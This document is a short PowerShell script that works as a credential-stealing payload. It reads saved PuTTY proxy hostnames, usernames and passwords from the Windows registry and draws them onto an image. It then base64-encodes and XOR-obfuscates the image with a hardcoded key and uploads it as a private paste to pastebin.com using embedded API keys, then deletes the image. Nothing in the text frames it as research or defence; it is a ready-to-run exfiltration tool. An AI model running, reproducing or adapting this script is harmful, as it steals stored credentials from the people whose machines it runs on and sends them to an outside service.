try{
    $content = (Get-ItemProperty -Path "HKCU:\Software\SimonTatham\PuTTY\Sessions\*" -ErrorAction Stop |select Proxyhost, ProxyUsername, ProxyPassword | out-string)
    Add-Type -AssemblyName System.Drawing
    $bmp = new-object System.Drawing.Bitmap 1920,1080
    $font = new-object System.Drawing.Font Consolas,18 
    $brushBg = [System.Drawing.Brushes]::White
    $brushFg = [System.Drawing.Brushes]::Black 
    $graphics = [System.Drawing.Graphics]::FromImage($bmp) 
    $graphics.FillRectangle($brushBg,0,0,$bmp.Width,$bmp.Height) 
    $graphics.DrawString($content,$font,$brushFg,500,100) 
    $graphics.Dispose() 
    $bmp.Save("./img.jpg")
    $content = [convert]::ToBase64String((gc "./img.jpg" -Encoding byte))
    $key = "SUPERSECRETKEY"
    Add-Type -AssemblyName System.Web
    $b64ed = [System.Web.HTTPUtility]::UrlEncode($($j=0;[convert]::ToBase64String($(for($i = 0;$i -lt $content.length;$i ++){[System.Text.Encoding]::UTF8.getBytes($content)[$i] -bxor [System.Text.Encoding]::UTF8.getBytes($key)[$j%$key.length]; $j++}))))
    $body = "api_dev_key=mQiMplTjO4G5AqJpFLXuXhQpkryZugnJ&api_paste_code="+$b64ed+"&api_option=paste&api_paste_private=1&api_user_key=452b99a2b4cc6bb03cd06e02ac93be56".replace("`n","").replace("`r","")
    #UPLOAD#
    Invoke-RestMethod -Uri "https://pastebin.com/api/api_post.php" -Method Post -Body $body
    del "./img.jpg"
}catch [System.Management.Automation.ItemNotFoundException] {
     echo "NOT FOUND"
 }